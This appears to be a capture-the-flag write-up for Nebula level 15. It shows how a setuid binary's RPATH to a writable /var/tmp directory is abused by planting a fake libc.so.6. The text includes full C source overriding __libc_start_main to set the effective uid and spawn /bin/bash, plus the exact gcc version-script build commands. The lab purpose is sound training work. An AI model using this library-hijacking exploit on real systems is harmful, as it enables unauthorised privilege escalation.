**Intro**

As stated by the [README](./README.md) this level also depends on the loading of a library to doing the dirty work and is similar in nature to the LD_PRELOAD tricks from earlier levels.

So, for starters we're supposed to [strace]() the binary and look for anything out of the ordinary.

```
﻿level15@nebula:/home/flag15$ ls
flag15
level15@nebula:/home/flag15$ ./flag15
strace it!
```

Guess they mean it, doing so renders the following output.

```
﻿level15@nebula:/home/flag15$ strace ./flag15 
execve("./flag15", ["./flag15"], [/* 19 vars */]) = 0
brk(0)                                  = 0x8355000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb776a000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/sse2/cmov", 0xbfb46894) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
.
. many more stat64 attempts
. 
stat64("/var/tmp/flag15/sse2/cmov", 0xbfb46894) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/sse2", 0xbfb46894) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/cmov", 0xbfb46894) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)     <<< libc.so.6 seems to be the popular target
stat64("/var/tmp/flag15", {st_mode=S_IFDIR|0775, st_size=3, ...}) = 0
open("/etc/ld.so.cache", O_RDONLY)      = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=33815, ...}) = 0
.
. more debugging info
. 
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7769000
write(1, "strace it!\n", 11strace it!
)            = 11
exit_group(11)                          = ?
```

As you can see the binary is trying to load a bunch of shared libraries from */var/tmp/flag15/* and other directories within there.
  

The *readelf* application comes in useful to see where a binary is loading libraries from.  In this case it *nm* confirms what we already discovered through the stack trace

```
﻿level15@nebula:/home/flag15$ readelf -d flag15

Dynamic section at offset 0xf20 contains 21 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]    << Here's where it's being told to read from another path
 0x0000000c (INIT)                       0x80482c0
 0x0000000d (FINI)                       0x80484ac
. 
.
.
```


Because the binary is running in [secure execution mode (suid) it will ignore LD_PRELOAD](http://man7.org/linux/man-pages/man8/ld.so.8.html) so t becomes necessary to find another way to inject a library.  Since *flag15* is attempting to load libraries with this folder we should attempt to satisfy that request

**Fluff removed from output for ease of reading**

```
﻿level15@nebula:/home/flag15$ touch /var/tmp/flag15/libc.so.6
level15@nebula:/home/flag15$ strace ./flag15 
.
.
.
﻿open("/var/tmp/flag15/libc.so.6", O_RDONLY) = 3
read(3, "", 512)                        = 0
close(3)                                = 0
writev(2, [{"./flag15", 8}, {": ", 2}, {"error while loading shared libra"..., 36}, {": ", 2}, {"/var/tmp/flag15/libc.so.6", 25}, {": ", 2}, {"file too short", 14}, {"", 0}, {"", 0}, {"\n", 1}], 10./flag15: error while loading shared libraries: /var/tmp/flag15/libc.so.6: file too short
) = 90
exit_group(127)                         = ?
```

So, we can create files there and it will try to load them.  Excellent, on to the next task.

**Finding available functions**

In order to hijack functions, we need to know which are available.  Using the tool ***nm** we can see which functions are available


```
﻿level15@nebula:/home/flag15$ nm -D flag15 
080484cc R _IO_stdin_used
         w __gmon_start__
         U __libc_start_main
         U puts
```

***[puts](http://www.cplusplus.com/reference/cstdio/puts/)*** is available but through research I had already stumbled upon a solution that said puts wouldn't work.  

I started to go down the path of using *__gmon_start__* but the documentation around this was spotty and testing/research also showed that **[libc_start_main](http://refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html)** was a more viable candidate.  

**poisoned_libc.c**

```
﻿#include <stdio.h>

int __libc_start_main(int (*main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end));
```

```
level15@nebula:~$ gcc -shared -fPIC poisoned_libc.c -o /var/tmp/flag15/libc.so.6
```

**Will it blend?**

```
﻿level15@nebula:/home/flag15$ ./flag15 
./flag15: /var/tmp/flag15/libc.so.6: no version information available (required by ./flag15)
./flag15: relocation error: ./flag15: symbol __libc_start_main, version GLIBC_2.0 not defined in file libc.so.6 with link time reference
```

Through a bit of research I discovered that the first error is a warning that can essentially be ignored, but the second error needed to be addressed with a ***version*** file and referenced with the ***-Wl,--version-script=version***

**File: version**

```
GLIBC_2.0{};
```


```
﻿level15@nebula:/home/flag15$ gcc -shared -Wl,--version-script=/home/level15/version -fPIC ~/poisoned_libc.c -o /var/tmp/flag15/libc.so.6
```


**Try, try again**

```
﻿level15@nebula:/home/flag15$ ./flag15 
./flag15: /var/tmp/flag15/libc.so.6: version `GLIBC_2.1.3' not found (required by /var/tmp/flag15/libc.so.6)
```


Yet another error?!?  Googling this revealed that the compiling I've done was dynamic and other downstream libraries are causing versioning issues.  The solution is to statically link the library with the ***-static-libgcc*** and ***Bstatic*** flags and define it in the version file

**File: version take two**

```
GLIBC_2.0{
global:__libc_start_main;
local: *;
};
```

```
﻿﻿level15@nebula:/home/flag15$ gcc -shared -static-libgcc -Wl,--version-script=/home/level15/version,-Bstatic -fPIC ~/poisoned_libc.c -o /var/tmp/flag15/libc.so.6

```


```
﻿level15@nebula:/home/flag15$ ./flag15 
Segmentation fault
```

With just the segmentation fault it's now worth trying to add something to the function besides the return to see if it'll execute the code.

**Final poisoned library**

```
﻿#include <stdio.h>

int __libc_start_main(int (*main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) {
  setresuid(geteuid(), geteuid(), geteuid());
  system("/bin/bash");
}
```

**Touchdown**

```
﻿level15@nebula:/home/flag15$ ./flag15 
flag15@nebula:/home/flag15$ getflag
You have successfully executed getflag on a target account
```

***References***
[Dynamic Linker Tricks]()

[Blog post by FlUxluS](http://fluxius.handgrep.se/2011/10/31/the-magic-of-ld_preload-for-userland-rootkits/) on this topic and userland rootkits.

[Final exploit library](../resources/level15_lib.c)
